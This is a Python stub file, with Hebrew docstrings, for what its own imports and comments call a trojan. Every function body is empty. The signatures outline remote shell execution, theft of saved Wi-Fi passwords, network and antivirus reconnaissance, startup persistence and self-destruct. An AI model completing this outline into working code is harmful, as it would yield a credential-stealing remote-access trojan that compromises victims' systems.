import subprocess as sub
import os, re
from time import sleep
from json import dumps, loads

from Api.ManaIO import set_trojan_start_on_up, CLEANUP
from Api.protocol import NOOD_NAME, NOOD_PATH, H_T_NAME


# פורמטים כללים
FORMAT_IP   = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
FORMAT_MAC  = r'[\x00-\x7F]{2}-[\x00-\x7F]{2}-[\x00-\x7F]{2}-[\x00-\x7F]{2}-[\x00-\x7F]{2}-[\x00-\x7F]{2}'
FORMAT_SOCK = FORMAT_IP+r"\:\d{0,9}"



def proxyCmd(cmd):
	"""
 	מבצע בדיקה סטטית על תוכן הפקודה ללא הרצה שלה
 	"""
	pass

def run_shell(cmd:str, timeout=6):
	"""
 	משמש להרצת פקודות על גבי המערכת
 	"""
	pass

def scan_by_payload(stream:bytes) -> bytes:
	"""
 	משמש את מצב סריקה
  	מקבל את תוכן חבילת המידע ועובד איתה
 	"""
	pass

def get_profiles_wifi(cmd:str) -> list[dict]:
	"""
 	פונקציה לפקודה ספציפית
  	מחזירה את הפרופילים הקיימים במערכת 
 	"""
	pass

def get_profiles_pass(profiles:list[dict], payload:str) -> list:
	"""
 	פונקציה לפקודה ספציפית
  	מחזירה את הסיסמאות לפרופילים במערכת
 	"""
	pass

def get_arp(cmd:str) -> list:
	"""
 	כשמה כן היא אך בהתאמה למצב סריקה
 	"""
	pass

def get_netstat(cmd:str):
	"""
 	כשמה כן היא אך בהתאמה למצב סריקה
 	"""
	pass

def get_config_wifi(cmd:str) -> list:
	"""
  	כשמה כן היא אך בהתאמה למצב סריקה
 	"""
	pass

def get_local_dns(cmd:str):
	"""
 	כשמה כן היא אך בהתאמה למצב סריקה
 	"""
	pass

def get_wmic_kb(cmd:str):
	"""
 	כשמה כן היא אך בהתאמה למצב סריקה
 	"""
	pass

def get_own_av(cmd:str)->list[dict]:
	"""
	כשמה כן היא אך בהתאמה למצב סריקה
 	"""
	pass

def get_system_apps(cmd:str) -> list[dict]:
	"""
 	כשמה כן היא אך בהתאמה למצב סריקה
 	"""
	pass

def get_size_window() -> tuple[int, int]:
	"""
 	מחזיר את תצורת גודל המסך של המערכת
 	"""
	pass

def kill_nood():
	"""
 	הריגת הסוס, כלומר סגירת התהליך כולן
 	"""
	pass

def restart():
	"""
 	כשמו כן הוא
 	"""
	pass

def set_sig(signal:dict) -> dict:
	"""
 	מטפל במצב אות
  	MODE_SIGNAL
   	הסוס מקבל הוראה ספציפית שלא צריך להחזיר איזשהוא פלט
    	כמו אתחול או השמדה עצמיתץ
 	"""
	pass
